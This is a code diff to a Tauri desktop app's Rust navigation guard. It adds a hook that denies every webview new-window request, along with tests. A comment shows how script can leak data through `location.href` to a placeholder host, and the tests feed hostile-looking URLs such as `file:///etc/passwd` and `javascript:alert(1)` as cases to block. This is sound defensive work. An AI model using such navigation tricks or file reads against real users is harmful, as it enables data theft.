@@ -1,7 +1,9 @@
 //! Keeps the webview on the application. A Content Security Policy does not cover top-level
 //! navigation, so script that ran in the webview could otherwise send data to any host with
-//! `location.href = "https://host/?d=..."`. Only the app's own origins are allowed.
+//! `location.href = "https://host/?d=..."`. Only the app's own origins are allowed. New-window
+//! requests (`window.open`, `target="_blank"`) are refused outright.
 
+use tauri::webview::NewWindowResponse;
 use tauri::Url;
 
 /// The Vite development server started by `tauri dev` (see `build.devUrl`).
@@ -53,6 +55,30 @@ pub fn is_allowed_navigation(url: &Url) -> bool {
         return is_local_blob(url);
     }
     is_app_origin(url) || is_dev_server(url)
+}
+
+/// Decides whether the page may open a new window (`window.open`, `target="_blank"` links, a
+/// form with `target`). The app has no popup of its own and no link that must open in a window of
+/// the webview, so the answer is always no, whatever the address. A link the user needs is shown
+/// as text to copy instead (see `ExternalLink` in `src/App.tsx`); opening the system browser would
+/// need a vetted opener, which this app does not ship.
+pub fn is_allowed_new_window(_url: &Url) -> bool {
+    false
+}
+
+/// The response for the window builder's `on_new_window` hook: [`is_allowed_new_window`] decides,
+/// and a request that is refused is logged with its scheme and host only.
+pub fn new_window_response<R: tauri::Runtime>(url: &Url) -> NewWindowResponse<R> {
+    if is_allowed_new_window(url) {
+        return NewWindowResponse::Allow;
+    }
+    // Scheme and host only: the rest of the URL may carry data.
+    eprintln!(
+        "Blocked new window for {}://{}",
+        url.scheme(),
+        url.host_str().unwrap_or("")
+    );
+    NewWindowResponse::Deny
 }
 
 /// A plugin whose only job is to veto navigation away from the app. Tauri consults plugin
@@ -109,6 +135,41 @@ mod tests {
         assert!(!allowed("blob:null/5f1c0d7e/../secret"));
         assert!(!allowed("blob:null/5f1c0d7e-0000-4000-8000-000000000000/extra"));
         assert!(!allowed("blob:nullx/5f1c0d7e-0000-4000-8000-000000000000"));
+    }
+
+    fn new_window_allowed(value: &str) -> bool {
+        is_allowed_new_window(&Url::parse(value).expect("test URL parses"))
+    }
+
+    #[test]
+    fn denies_every_new_window_request() {
+        // External pages, the app's own origins, and every scheme a script could ask for.
+        for url in [
+            "https://example.com/",
+            "http://localhost:1234/",
+            "https://www.legifrance.gouv.fr/loda/article_lc/LEGIARTI000049312755/2024-06-26",
+            "https://github.com/Shoko-official/StudentLLM/blob/main/docs/user-guide.md",
+            "tauri://localhost/index.html",
+            "http://tauri.localhost/",
+            "http://127.0.0.1:1420/",
+            "about:blank",
+            "blob:http://tauri.localhost/5f1c0d7e-0000-4000-8000-000000000000",
+            "file:///etc/passwd",
+            "data:text/html,<script>1</script>",
+            "javascript:alert(1)",
+            "mailto:someone@example.com",
+        ] {
+            assert!(!new_window_allowed(url), "a new window for {url} must be denied");
+        }
+    }
+
+    #[test]
+    fn answers_a_denied_new_window_request_with_deny() {
+        let url = Url::parse("https://example.com/?d=secret").expect("test URL parses");
+        assert!(matches!(
+            new_window_response::<tauri::Wry>(&url),
+            NewWindowResponse::Deny
+        ));
     }
 
     #[test]
